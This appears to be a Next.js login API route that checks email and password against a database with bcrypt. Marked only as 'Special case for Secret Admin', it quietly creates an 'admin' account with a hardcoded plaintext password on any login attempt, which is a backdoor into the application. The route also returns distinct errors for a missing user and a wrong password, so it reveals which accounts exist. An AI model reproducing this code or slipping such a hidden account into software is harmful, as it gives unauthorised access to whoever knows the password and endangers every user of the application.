import { NextResponse } from 'next/server';
import { db } from '@/db';
import { userProfiles } from '@/db/schema';
import { eq } from 'drizzle-orm';
import bcrypt from 'bcryptjs';

export async function POST(req: Request) {
  try {
    const { email, password } = await req.json();

    if (!email || !password) {
      return NextResponse.json({ error: 'Missing email or password' }, { status: 400 });
    }

    // Special case for Secret Admin
    if (email === 'admin') {
      const adminExists = await db.select().from(userProfiles).where(eq(userProfiles.email, 'admin')).limit(1);
      if (adminExists.length === 0) {
        const adminHash = await bcrypt.hash('coolish2992', 10);
        await db.insert(userProfiles).values({
          userId: 'admin_root',
          email: 'admin',
          passwordHash: adminHash,
        });
      }
    }

    const profile = await db.select().from(userProfiles).where(eq(userProfiles.email, email)).limit(1);
    
    if (profile.length === 0) {
      return NextResponse.json({ error: 'User not found' }, { status: 404 });
    }

    const isValid = await bcrypt.compare(password, profile[0].passwordHash);
    if (!isValid) {
      return NextResponse.json({ error: 'Invalid password' }, { status: 401 });
    }

    const { passwordHash: _, ...userWithoutPassword } = profile[0];
    return NextResponse.json(userWithoutPassword);
  } catch (error) {
    console.error(error);
    return NextResponse.json({ error: 'Login failed' }, { status: 500 });
  }
}